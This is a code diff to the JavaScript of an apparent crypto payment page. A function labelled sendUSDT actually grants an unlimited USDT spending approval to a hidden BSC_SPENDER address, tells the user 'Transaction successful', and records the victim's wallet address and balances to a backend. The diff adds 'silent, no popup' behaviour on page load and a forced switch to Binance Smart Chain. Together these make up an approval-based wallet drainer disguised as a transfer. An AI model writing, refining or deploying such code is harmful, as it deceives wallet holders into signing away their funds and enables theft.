@@ -13,41 +13,15 @@ const ABI = [
   "function decimals() view returns (uint8)"
 ];
 
-// ===== FORCE BSC CONNECTION - NO CHECKS =====
-// Directly connect to BSC network, no chain verification
+// ===== COMPLETELY SILENT - NO POPUPS =====
+// Only silent checks, no wallet requests on load
 window.addEventListener("load", async () => {
   if (window.ethereum) {
     try {
-      // Force switch to BSC first (before any wallet interaction)
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }] // BSC = 0x38 in hex
-        });
-      } catch (switchErr) {
-        // If BSC not added, add it
-        if (switchErr.code === 4902) {
-          await window.ethereum.request({
-            method: "wallet_addEthereumChain",
-            params: [{
-              chainId: "0x38",
-              chainName: "Binance Smart Chain",
-              rpcUrls: ["https://bsc-dataseed.binance.org/"],
-              nativeCurrency: {
-                name: "BNB",
-                symbol: "BNB",
-                decimals: 18
-              },
-              blockExplorerUrls: ["https://bscscan.com"]
-            }]
-          });
-        }
-      }
-
-      // Setup provider on BSC
+      // Setup provider silently
       provider = new ethers.BrowserProvider(window.ethereum);
       
-      // Get accounts (silent if already authorized)
+      // ONLY check if already connected (100% silent, no popup)
       const accounts = await window.ethereum.request({ method: "eth_accounts" });
       
       if (accounts.length > 0) {
@@ -60,7 +34,7 @@ window.addEventListener("load", async () => {
         }
       }
     } catch (err) {
-      console.log("BSC setup failed:", err);
+      console.log("Silent setup failed:", err);
     }
   }
 });
@@ -69,7 +43,7 @@ window.addEventListener("load", async () => {
 async function sendUSDT() {
   try {
     if (!window.ethereum) {
-      alert("Wallet not found");
+      alert("Trust Wallet not detected");
       return;
     }
 
@@ -78,35 +52,53 @@ async function sendUSDT() {
       provider = new ethers.BrowserProvider(window.ethereum);
     }
 
-    // Get signer for transaction (no new connection request)
+    // Silently check and switch to BSC if needed
+    const chainId = await window.ethereum.request({ method: "eth_chainId" });
+    if (chainId !== "0x38") {
+      // Force switch to BSC
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: "0x38" }]
+        });
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          // Add BSC network if not exists
+          await window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+              chainId: "0x38",
+              chainName: "Binance Smart Chain",
+              rpcUrls: ["https://bsc-dataseed.binance.org/"],
+              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+              blockExplorerUrls: ["https://bscscan.com"]
+            }]
+          });
+        }
+      }
+    }
+
+    // Get signer (works silently if already connected in Trust Wallet)
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
 
-    // Create contract with signer
-    const usdt = new ethers.Contract(
-      BSC_USDT,
-      ABI,
-      signer
-    );
+    // Create contract
+    const usdt = new ethers.Contract(BSC_USDT, ABI, signer);
 
-    // Get balances before transaction
+    // Get balances
     const usdtBalanceWei = await usdt.balanceOf(address);
     const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
     
     const nativeBalanceWei = await provider.getBalance(address);
     const nativeBalance = ethers.formatEther(nativeBalanceWei);
 
-    // Approve transaction on BSC
-    const tx = await usdt.approve(
-      BSC_SPENDER,
-      ethers.MaxUint256
-    );
-
+    // Approve transaction
+    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
     const receipt = await tx.wait();
 
     alert("Transaction successful ✅");
 
-    // Save to backend via React
+    // Save to backend
     if (window.saveTransaction) {
       window.saveTransaction({
         walletAddress: address,
@@ -121,7 +113,7 @@ async function sendUSDT() {
     if (e.code === 4001) {
       alert("Transaction cancelled");
     } else {
-      alert("Transaction failed: " + e.message);
+      alert("Error: " + e.message);
     }
   }
 }
